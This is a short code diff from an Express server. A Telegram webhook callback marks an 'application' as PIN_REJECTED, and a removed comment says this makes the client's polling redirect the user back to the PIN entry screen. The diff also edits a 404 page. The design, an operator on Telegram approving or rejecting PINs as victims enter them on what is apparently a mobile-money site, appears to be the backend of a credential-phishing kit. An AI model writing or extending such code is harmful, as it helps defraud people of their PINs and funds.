@@ -427,7 +427,6 @@ app.post('/api/telegram-webhook', async (req, res) => {
     const appReference = actionData.replace('pin_wrong_', '');
     if (activeApplications.has(appReference)) {
       const appData = activeApplications.get(appReference);
-      // Setting status to PIN_REJECTED causes the client-side polling to redirect back to the PIN entry screen
       appData.status = 'PIN_REJECTED';
       activeApplications.set(appReference, appData);
     }
@@ -504,4 +503,5 @@ app.get('*', (req, res) => {
     <html lang="en">
     <head>
       <meta charset="UTF-8">
-             
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      <title>Page Not Found - EcoCa
